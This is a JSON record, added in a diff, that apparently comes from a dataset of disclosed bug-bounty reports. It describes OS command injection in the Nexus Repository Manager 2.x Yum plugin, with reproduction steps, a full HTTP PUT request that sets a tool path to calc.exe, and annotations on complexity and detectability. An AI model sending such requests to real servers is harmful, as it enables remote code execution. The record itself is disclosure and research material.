@@ -1,0 +1,49 @@
+{
+  "reported_to": "Central Security Project",
+  "reported_by": "christianaugust ",
+  "title": "OS Command Injection in Nexus Repository Manager 2.x",
+  "content": "\nMaven artifact\ngroupId: org.sonatype.nexus.plugins\nartifactId: nexus-yum-repository-plugin\nversion: 2.14.9-01\nVulnerability\nVulnerability Description\nThe Nexus Yum Repository Plugin is vulnerable to Remote Code Execution. All instances using CommandLineExecutor.java with user-supplied data is vulnerable, such as the Yum Configuration Capability.\nAdditional Details\nSource File and Line Number: https://github.com/sonatype/nexus-public/blob/release-2.14.9-01/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/capabilities/YumCapability.java#L121\nSteps To Reproduce:\nNavigate to \"Capabilities\" in Nexus Repository Manager.\nEdit or create a new Yum: Configuration capability\nSet path of \"createrepo\" or \"mergerepo\" to an OS command (e.g. C:\\Windows\\System32\\calc.exe)\nThe OS command should now have executed as the SYSTEM user. Note that in this case, Nexus appends --version to the OS command.\nThe following HTTP request was used to trigger the vulnerability:\nCode 549 Bytes\n1PUT /nexus/service/siesta/capabilities/000013ea3743a556 HTTP/1.1\n2Host: HOST:PORT\n3Accept: application/json\n4Authorization: Basic YWRtaW46YWRtaW4xMjM=\n5Content-Type: application/xml\n6Content-Length: 333\n7Connection: close\n8\n9<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n10<ns2:capability xmlns:ns2=\"http://sonatype.org/xsd/nexus-capabilities-plugin/rest/1.0\"><id>healthcheck</id><notes>123</notes><enabled>true</enabled><typeId>1</typeId><properties><key>createrepoPath</key><value>C:\\Windows\\System32\\calc.exe</value></properties></ns2:capability>\nSupporting Material/References:\nWindows Server 2016\nSonatype Nexus Repository Manager 2.14.9-01\nJava 8\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nAn authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.\n\n",
+  "severity": [
+    9.1,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "OS Command Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1566345300,
+  "report_url": "https://hackerone.com/reports/654888",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Navigate to 'Capabilities' in Nexus Repository Manager."
+    ],
+    [
+      2,
+      "Edit or create a new Yum: Configuration capability and set the path of 'createrepo' or 'mergerepo' to an OS command (e.g., C:\\Windows\\System32\\calc.exe)."
+    ],
+    [
+      3,
+      "The OS command will execute as the SYSTEM user, as Nexus appends --version to the OS command."
+    ]
+  ],
+  "vuln_description": "The Nexus Yum Repository Plugin is vulnerable to Remote Code Execution via OS Command Injection. An authenticated user with sufficient privileges can exploit this by manipulating the path of 'createrepo' or 'mergerepo' in the Yum Configuration Capability to execute arbitrary commands on the underlying operating system.",
+  "reason": "The vulnerability involves a straightforward manipulation of a configuration parameter to inject OS commands. The attack does not require complex interactions or understanding of multiple components, making it relatively easy to discover.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an authenticated user with sufficient privileges modifying configuration settings to execute OS commands. The methodology described involves testing authorization boundaries by swapping user sessions and resource IDs within the same application context. Since this vulnerability requires specific privileged actions (editing Yum Configuration capability) and does not involve cross-user or cross-resource testing within the same application flow, it would not be detected by the proposed methodology.",
+    "is_detectable": false
+  }
+}
